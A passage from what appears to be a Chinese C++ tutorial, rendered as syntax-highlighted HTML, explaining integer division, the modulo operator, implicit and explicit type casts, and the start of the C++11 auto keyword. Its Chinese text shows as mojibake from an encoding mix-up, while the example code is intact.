æ•´æ•°é™¤æ³•</span></span><br><span class="line">    <span class="keyword">int</span> result_i1 = <span class="number">9</span> / <span class="number">5</span>;     <span class="comment">// ä¸¤ä¸ª int</span></span><br><span class="line">    <span class="keyword">int</span> result_i2 = <span class="number">10</span> / <span class="number">3</span>;    <span class="comment">// ä¸¤ä¸ª int</span></span><br><span class="line">    <span class="keyword">int</span> result_i3 = <span class="number">13</span> / <span class="number">4</span>;    <span class="comment">// ä¸¤ä¸ª int</span></span><br><span class="line">    <span class="keyword">int</span> result_i4 = <span class="number">-10</span> / <span class="number">3</span>;   <span class="comment">// è´Ÿæ•°æ•´æ•°é™¤æ³• (ç»“æœé€šå¸¸å‘é›¶æˆªæ–­ï¼Œä¸º -3)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9 / 5     = &quot;</span> &lt;&lt; result_i1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1 (å°æ•°éƒ¨åˆ† 0.8 è¢«æˆªæ–­)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 / 3    = &quot;</span> &lt;&lt; result_i2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3 (å°æ•°éƒ¨åˆ† 0.333... è¢«æˆªæ–­)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;13 / 4    = &quot;</span> &lt;&lt; result_i3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3 (å°æ•°éƒ¨åˆ† 0.25 è¢«æˆªæ–­)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 / 3   = &quot;</span> &lt;&lt; result_i4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º -3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æƒ³è¦å¾—åˆ°æµ®ç‚¹ç»“æœï¼Œéœ€è¦ç¡®ä¿è‡³å°‘ä¸€ä¸ªæ“ä½œæ•°æ˜¯æµ®ç‚¹ç±»å‹</span></span><br><span class="line">    <span class="comment">// å¯ä»¥ä½¿ç”¨ç±»å‹è½¬æ¢ (è§ 3.4.4)</span></span><br><span class="line">    <span class="keyword">double</span> result_mixed = <span class="keyword">double</span>(<span class="number">9</span>) / <span class="number">5</span>; <span class="comment">// å°† 9 è½¬æ¢ä¸º double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double(9) / 5 = &quot;</span> &lt;&lt; result_mixed &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1.8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> è¿›è¡Œé™¤æ³•è¿ç®—æ—¶ï¼ŒåŠ¡å¿…æ¸…æ¥šæ“ä½œæ•°çš„ç±»å‹ï¼Œä»¥ç¡®ä¿å¾—åˆ°æœŸæœ›çš„ç»“æœï¼ˆæ•´æ•°æˆªæ–­æˆ–æµ®ç‚¹å°æ•°ï¼‰ã€‚</p><h3 id="3-4-3-æ±‚æ¨¡è¿ç®—ç¬¦"><a href="#3-4-3-æ±‚æ¨¡è¿ç®—ç¬¦" class="headerlink" title="3.4.3 æ±‚æ¨¡è¿ç®—ç¬¦"></a>3.4.3 æ±‚æ¨¡è¿ç®—ç¬¦</h3><p>æ±‚æ¨¡è¿ç®—ç¬¦ <code>%</code> è®¡ç®—æ•´æ•°é™¤æ³•çš„**ä½™æ•° (Remainder)**ã€‚å®ƒè¦æ±‚ä¸¤ä¸ªæ“ä½œæ•°éƒ½å¿…é¡»æ˜¯æ•´æ•°ç±»å‹ï¼ˆæˆ–å¯ä»¥è½¬æ¢ä¸ºæ•´æ•°çš„ç±»å‹ï¼Œå¦‚ <code>char</code>, <code>bool</code>ï¼‰ã€‚</p><p><strong>è¿ç®—è§„åˆ™:</strong><br><code>a % b</code> çš„ç»“æœæ˜¯ <code>a</code> é™¤ä»¥ <code>b</code> åçš„ä½™æ•°ã€‚å…¶ç¬¦å·é€šå¸¸ä¸è¢«é™¤æ•° <code>a</code> çš„ç¬¦å·ç›¸åŒï¼ˆC++11 æ ‡å‡†è§„å®šå¦‚æ­¤ï¼‰ã€‚</p><p><strong>æ•°å­¦å…³ç³»:</strong><br>å¯¹äºæ•´æ•° <code>a</code> å’Œ <code>b</code> (å…¶ä¸­ <code>b != 0</code>)ï¼Œä»¥ä¸‹å…³ç³»é€šå¸¸æˆç«‹ï¼š<br><code>(a / b) * b + (a % b) == a</code></p><p><strong>ç”¨é€”:</strong></p><ul><li>  åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦èƒ½è¢«å¦ä¸€ä¸ªæ•°æ•´é™¤ï¼ˆå¦‚æœ <code>a % b == 0</code>ï¼Œåˆ™ <code>a</code> èƒ½è¢« <code>b</code> æ•´é™¤ï¼‰ã€‚</li><li>  è·å–ä¸€ä¸ªæ•°çš„æœ€ä½ä½æ•°å­—ï¼ˆ<code>num % 10</code>ï¼‰ã€‚</li><li>  å°†æ•°å€¼é™åˆ¶åœ¨ä¸€ä¸ªèŒƒå›´å†…ï¼ˆä¾‹å¦‚ï¼Œç”Ÿæˆ 0 åˆ° N-1 ä¹‹é—´çš„æ•°ï¼š<code>value % N</code>ï¼‰ã€‚</li><li>  å‘¨æœŸæ€§æ“ä½œï¼ˆä¾‹å¦‚ï¼Œæ¯éš” M ä¸ªå…ƒç´ æ‰§è¡Œä¸€æ¬¡æ“ä½œï¼š<code>if (count % M == 0)</code>ï¼‰ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total_seconds = <span class="number">135</span>;</span><br><span class="line">    <span class="keyword">int</span> seconds_per_minute = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> minutes = total_seconds / seconds_per_minute; <span class="comment">// æ•´æ•°é™¤æ³•å¾—åˆ†é’Ÿæ•°</span></span><br><span class="line">    <span class="keyword">int</span> remaining_seconds = total_seconds % seconds_per_minute; <span class="comment">// æ±‚æ¨¡å¾—å‰©ä½™ç§’æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; total_seconds &lt;&lt; <span class="string">&quot; seconds is &quot;</span> </span><br><span class="line">              &lt;&lt; minutes &lt;&lt; <span class="string">&quot; minutes and &quot;</span> </span><br><span class="line">              &lt;&lt; remaining_seconds &lt;&lt; <span class="string">&quot; seconds.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 135 seconds is 2 minutes and 15 seconds.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ¤æ–­å¥‡å¶æ€§</span></span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (number % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; number &lt;&lt; <span class="string">&quot; is even.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; number &lt;&lt; <span class="string">&quot; is odd.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 21 is odd.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–ä¸ªä½æ•°</span></span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">int</span> last_digit = value % <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The last digit of &quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; last_digit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è´Ÿæ•°æ±‚æ¨¡ (C++11 åŠä»¥åï¼Œç»“æœç¬¦å·ä¸è¢«é™¤æ•°ä¸€è‡´)</span></span><br><span class="line">    <span class="keyword">int</span> result1 = <span class="number">10</span> % <span class="number">3</span>;   <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">int</span> result2 = <span class="number">-10</span> % <span class="number">3</span>;  <span class="comment">// -1</span></span><br><span class="line">    <span class="keyword">int</span> result3 = <span class="number">10</span> % <span class="number">-3</span>;  <span class="comment">// 1 </span></span><br><span class="line">    <span class="keyword">int</span> result4 = <span class="number">-10</span> % <span class="number">-3</span>; <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 % 3 = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 % 3 = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 % -3 = &quot;</span> &lt;&lt; result3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 % -3 = &quot;</span> &lt;&lt; result4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸èƒ½ç”¨äºæµ®ç‚¹æ•°</span></span><br><span class="line">    <span class="comment">// double remainder = 10.5 % 3.2; // ç¼–è¯‘é”™è¯¯!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-4-ç±»å‹è½¬æ¢"><a href="#3-4-4-ç±»å‹è½¬æ¢" class="headerlink" title="3.4.4 ç±»å‹è½¬æ¢"></a>3.4.4 ç±»å‹è½¬æ¢</h3><p>C++å…è®¸åœ¨ä¸åŒæ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼Œè¿™ç§°ä¸º<strong>ç±»å‹è½¬æ¢ (Type Casting)**ã€‚è½¬æ¢å¯ä»¥</strong>éšå¼ (Implicitly)** å‘ç”Ÿï¼ˆç”±ç¼–è¯‘å™¨è‡ªåŠ¨å®Œæˆï¼‰ï¼Œä¹Ÿå¯ä»¥<strong>æ˜¾å¼ (Explicitly)</strong> è¿›è¡Œï¼ˆç”±ç¨‹åºå‘˜é€šè¿‡ä»£ç æŒ‡å®šï¼‰ã€‚</p><p><strong>éšå¼ç±»å‹è½¬æ¢ (Automatic Conversion):</strong></p><p>åœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ‰§è¡Œç±»å‹è½¬æ¢ï¼š</p><ol><li><strong>æ··åˆç±»å‹è¡¨è¾¾å¼:</strong> å½“ä¸€ä¸ªè¡¨è¾¾å¼ä¸­åŒ…å«ä¸åŒæ•°å€¼ç±»å‹çš„æ“ä½œæ•°æ—¶ï¼Œè¾ƒå°æˆ–è¾ƒä½ä¼˜å…ˆçº§çš„ç±»å‹é€šå¸¸ä¼šè¢«<strong>æå‡ (Promoted)</strong> ä¸ºè¾ƒå¤§æˆ–è¾ƒé«˜ä¼˜å…ˆçº§çš„ç±»å‹ï¼Œç„¶åè¿›è¡Œè¿ç®—ã€‚<ul><li>  <strong>æ•´å‹æå‡ (Integral Promotion):</strong> æ¯” <code>int</code> å°çš„æ•´å‹ï¼ˆ<code>bool</code>, <code>char</code>, <code>signed char</code>, <code>unsigned char</code>, <code>short</code>, <code>unsigned short</code>ï¼‰åœ¨è¡¨è¾¾å¼ä¸­é€šå¸¸ä¼šè¢«æå‡ä¸º <code>int</code> (å¦‚æœ <code>int</code> èƒ½å®¹çº³å…¶æ‰€æœ‰å€¼) æˆ– <code>unsigned int</code>ã€‚</li><li>  <strong>ç®—æœ¯è½¬æ¢ (Usual Arithmetic Conversions):</strong> åœ¨æ¶‰åŠä¸åŒç®—æœ¯ç±»å‹ï¼ˆæ•´å‹å’Œæµ®ç‚¹å‹ï¼‰çš„è¿ç®—ä¸­ï¼Œéµå¾ªä¸€å¥—è§„åˆ™å°†æ“ä½œæ•°è½¬æ¢ä¸ºå…±åŒçš„ç±»å‹ï¼ˆé€šå¸¸æ˜¯ä¸¤è€…ä¸­â€œæ›´å®½â€æˆ–ç²¾åº¦æ›´é«˜çš„ç±»å‹ï¼‰ã€‚ä¾‹å¦‚ï¼Œ<code>int</code> å’Œ <code>double</code> è¿ç®—æ—¶ï¼Œ<code>int</code> ä¼šè¢«è½¬æ¢ä¸º <code>double</code>ã€‚<code>float</code> å’Œ <code>double</code> è¿ç®—æ—¶ï¼Œ<code>float</code> ä¼šè¢«è½¬æ¢ä¸º <code>double</code>ã€‚</li></ul></li><li> <strong>èµ‹å€¼:</strong> å°†ä¸€ä¸ªç±»å‹çš„å€¼èµ‹ç»™å¦ä¸€ç§ç±»å‹çš„å˜é‡æ—¶ï¼Œå³ä¾§çš„å€¼ä¼šè¢«è½¬æ¢ä¸ºå·¦ä¾§å˜é‡çš„ç±»å‹ã€‚è¿™å¯èƒ½å¯¼è‡´ç²¾åº¦æŸå¤±ï¼ˆå¦‚ <code>double</code> è½¬ <code>int</code>ï¼‰æˆ–èŒƒå›´é—®é¢˜ï¼ˆå¦‚ <code>long</code> è½¬ <code>short</code>ï¼‰ã€‚</li><li> <strong>å‡½æ•°å‚æ•°ä¼ é€’:</strong> å°†å‚æ•°ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œå¦‚æœå®å‚ç±»å‹ä¸å½¢å‚ç±»å‹ä¸åŒ¹é…ï¼Œä¼šå°è¯•è¿›è¡Œè½¬æ¢ã€‚</li><li> <strong>å‡½æ•°è¿”å›å€¼:</strong> ä»å‡½æ•°è¿”å›ä¸€ä¸ªå€¼æ—¶ï¼Œå¦‚æœè¿”å›å€¼ç±»å‹ä¸å‡½æ•°å£°æ˜çš„è¿”å›ç±»å‹ä¸åŒ¹é…ï¼Œä¼šå°è¯•è¿›è¡Œè½¬æ¢ã€‚</li></ol><p><strong>æ˜¾å¼ç±»å‹è½¬æ¢ (Explicit Casting):</strong></p><p>å½“éœ€è¦å¼ºåˆ¶è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæˆ–è€…ä¸ºäº†ä½¿ä»£ç æ„å›¾æ›´æ¸…æ™°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢ã€‚C++æä¾›äº†å¤šç§è½¬æ¢æ–¹å¼ï¼š</p><ol><li><p><strong>C é£æ ¼å¼ºåˆ¶ç±»å‹è½¬æ¢ (C-Style Cast):</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(typeName) expression</span><br><span class="line">typeName (expression) <span class="comment">// å‡½æ•°å¼è½¬æ¢</span></span><br></pre></td></tr></table></figure><p> è¿™ç§æ–¹å¼ç®€å•ç›´æ¥ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ä¸å¤Ÿå®‰å…¨ï¼Œå› ä¸ºå®ƒå¯èƒ½æ‰§è¡Œå¤šç§ä¸åŒç±»å‹çš„è½¬æ¢ï¼ˆå¦‚ <code>static_cast</code>, <code>const_cast</code>, <code>reinterpret_cast</code> çš„ç»„åˆï¼‰ã€‚</p></li><li><p><strong>C++ ç±»å‹è½¬æ¢è¿ç®—ç¬¦ (C++ Cast Operators):</strong> (æ›´æ¨èï¼Œæ›´å®‰å…¨ï¼Œæ„å›¾æ›´æ˜ç¡®)</p><ul><li>  <code>static_cast&lt;typeName&gt;(expression)</code>: ç”¨äºæ¯”è¾ƒâ€œè‡ªç„¶â€å’Œå®‰å…¨çš„è½¬æ¢ï¼Œå¦‚æ•°å€¼ç±»å‹ä¹‹é—´çš„è½¬æ¢ï¼ˆæ•´æ•°ä¸æµ®ç‚¹æ•°äº’è½¬ã€æ•´æ•°ä¸æ•´æ•°äº’è½¬ï¼‰ã€æŒ‡é’ˆç±»å‹ä¹‹é—´çš„ç›¸å…³è½¬æ¢ï¼ˆå¦‚ <code>void*</code> ä¸å…¶ä»–ç±»å‹æŒ‡é’ˆäº’è½¬ã€åŸºç±»æŒ‡é’ˆä¸æ´¾ç”Ÿç±»æŒ‡é’ˆäº’è½¬ï¼Œä½†éœ€è¦è°¨æ…ï¼‰ã€‚è¿™æ˜¯æœ€å¸¸ç”¨çš„ C++ è½¬æ¢ç¬¦ã€‚</li><li>  <code>dynamic_cast&lt;typeName&gt;(expression)</code>: ä¸»è¦ç”¨äºå¤„ç†ç±»ç»§æ‰¿å±‚æ¬¡ç»“æ„ä¸­çš„æŒ‡é’ˆæˆ–å¼•ç”¨è½¬æ¢ï¼ˆå‘ä¸‹è½¬å‹ï¼‰ï¼Œå¹¶åœ¨è¿è¡Œæ—¶è¿›è¡Œç±»å‹æ£€æŸ¥ã€‚å¦‚æœè½¬æ¢æ— æ•ˆï¼Œå¯¹äºæŒ‡é’ˆä¼šè¿”å› <code>nullptr</code>ï¼Œå¯¹äºå¼•ç”¨ä¼šæŠ›å‡º <code>std::bad_cast</code> å¼‚å¸¸ã€‚éœ€è¦åŸºç±»æ˜¯å¤šæ€çš„ï¼ˆè‡³å°‘æœ‰ä¸€ä¸ªè™šå‡½æ•°ï¼‰ã€‚</li><li>  <code>const_cast&lt;typeName&gt;(expression)</code>: ç”¨äºæ·»åŠ æˆ–ç§»é™¤è¡¨è¾¾å¼çš„ <code>const</code> æˆ– <code>volatile</code> é™å®šç¬¦ã€‚é€šå¸¸ç”¨äºå»é™¤ <code>const</code>ï¼Œä½†ä¿®æ”¹åŸæœ¬æ˜¯ <code>const</code> çš„å¯¹è±¡æ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚ä¸»è¦ç”¨äºå¤„ç†å¸¸é‡æ€§ä¸åŒ¹é…çš„æ—§ APIã€‚</li><li>  <code>reinterpret_cast&lt;typeName&gt;(expression)</code>: ç”¨äºä½çº§åˆ«çš„ã€é€šå¸¸ä¸å®ç°ç›¸å…³çš„ã€ä¸å®‰å…¨çš„è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œåœ¨æ•´æ•°å’ŒæŒ‡é’ˆä¹‹é—´è¿›è¡Œè½¬æ¢ï¼Œæˆ–è€…åœ¨ä¸ç›¸å…³çš„æŒ‡é’ˆç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚åº”æåŠ›é¿å…ä½¿ç”¨ï¼Œé™¤éç¡®å®ç†è§£å…¶åº•å±‚å«ä¹‰å’Œé£é™©ã€‚</li></ul></li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// éšå¼è½¬æ¢ç¤ºä¾‹</span></span><br><span class="line">    <span class="keyword">int</span> i_val = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> d_val = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">short</span> s_val = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ··åˆè¡¨è¾¾å¼ (ç®—æœ¯è½¬æ¢)</span></span><br><span class="line">    <span class="keyword">double</span> result1 = i_val + d_val; <span class="comment">// i_val (int) æå‡ä¸º double (10.0), ç»“æœæ˜¯ double (13.14)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int + double = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ•´å‹æå‡</span></span><br><span class="line">    <span class="keyword">char</span> c_val = <span class="string">&#x27;A&#x27;</span>; <span class="comment">// ASCII ç  65</span></span><br><span class="line">    <span class="keyword">int</span> result2 = c_val + s_val; <span class="comment">// c_val (char) å’Œ s_val (short) éƒ½æå‡ä¸º int, ç»“æœæ˜¯ int (70)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;char + short = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// èµ‹å€¼è½¬æ¢ (å¯èƒ½ä¸¢å¤±ä¿¡æ¯)</span></span><br><span class="line">    <span class="keyword">int</span> i_from_d = d_val; <span class="comment">// d_val (3.14) è½¬æ¢ä¸º int, å°æ•°éƒ¨åˆ†æˆªæ–­, i_from_d å˜ä¸º 3</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int from double = &quot;</span> &lt;&lt; i_from_d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">short</span> s_from_i = <span class="number">100000</span>; <span class="comment">// 100000 å¯èƒ½è¶…å‡º short èŒƒå›´, ç»“æœæœªå®šä¹‰æˆ–å›ç»•</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short from large int = &quot;</span> &lt;&lt; s_from_i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¾å¼è½¬æ¢ç¤ºä¾‹</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C é£æ ¼è½¬æ¢ (ç”¨äºæµ®ç‚¹é™¤æ³•)</span></span><br><span class="line">    <span class="keyword">double</span> average1 = (<span class="keyword">double</span>)total / count; </span><br><span class="line">    <span class="keyword">double</span> average2 = <span class="keyword">double</span>(total) / count; <span class="comment">// å‡½æ•°å¼è½¬æ¢</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(double)total / count = &quot;</span> &lt;&lt; average1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double(total) / count = &quot;</span> &lt;&lt; average2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3.8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++ static_cast (æ¨èç”¨äºæ•°å€¼è½¬æ¢)</span></span><br><span class="line">    <span class="keyword">double</span> average3 = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(total) / count;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;static_cast&lt;double&gt;(total) / count = &quot;</span> &lt;&lt; average3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3.8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> char_code = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="string">&#x27;B&#x27;</span>); <span class="comment">// char è½¬ int</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Code for &#x27;B&#x27;: &quot;</span> &lt;&lt; char_code &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 66</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¼”ç¤º reinterpret_cast (é€šå¸¸ä¸æ¨è)</span></span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">1000</span>;</span><br><span class="line">    <span class="comment">// int* ptr = reinterpret_cast&lt;int*&gt;(addr); // å°†æ•´æ•°è§†ä¸ºåœ°å€ (å±é™©!)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Pointer from address: &quot; &lt;&lt; ptr &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å»ºè®®:</strong></p><ul><li>  å°½é‡é¿å…ä¸å¿…è¦çš„ç±»å‹è½¬æ¢ã€‚</li><li>  ä¼˜å…ˆä½¿ç”¨ C++ çš„ <code>static_cast</code> è¿›è¡Œæ˜ç¡®ä¸”ç›¸å¯¹å®‰å…¨çš„æ•°å€¼æˆ–ç›¸å…³æŒ‡é’ˆè½¬æ¢ã€‚</li><li>  è°¨æ…ä½¿ç”¨ C é£æ ¼è½¬æ¢ï¼Œå› ä¸ºå®ƒéšè—äº†è½¬æ¢çš„ç±»å‹å’Œé£é™©ã€‚</li><li>  ä»…åœ¨ç»å¯¹å¿…è¦ä¸”ç†è§£åæœçš„æƒ…å†µä¸‹ä½¿ç”¨ <code>const_cast</code> å’Œ <code>reinterpret_cast</code>ã€‚</li><li>  æ³¨æ„éšå¼è½¬æ¢å¯èƒ½å¯¼è‡´çš„ç²¾åº¦æŸå¤±æˆ–æ„å¤–è¡Œä¸ºï¼Œå°¤å…¶æ˜¯åœ¨æ··åˆæœ‰ç¬¦å·å’Œæ— ç¬¦å·æ•´æ•°æ—¶ã€‚</li></ul><h3 id="3-4-5-C-11ä¸­çš„autoå£°æ˜"><a href="#3-4-5-C-11ä¸­çš„autoå£°æ˜" class="headerlink" title="3.4.5 C++11ä¸­çš„autoå£°æ˜"></a>3.4.5 C++11ä¸­çš„autoå£°æ˜</h3><p>C++11 å¼•å…¥äº† <code>auto</code> å…³é”®å­—ï¼Œå®ƒå…è®¸ç¼–è¯‘å™¨æ ¹æ®å˜é‡çš„<strong>åˆå§‹åŒ–è¡¨è¾¾å¼ (Initializer)</strong> è‡ªåŠ¨æ¨æ–­å‡ºå˜é‡çš„ç±»å‹ã€‚è¿™å¯ä»¥ç®€åŒ–ä»£ç ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤æ‚ç±»å‹ï¼ˆå¦‚ STL 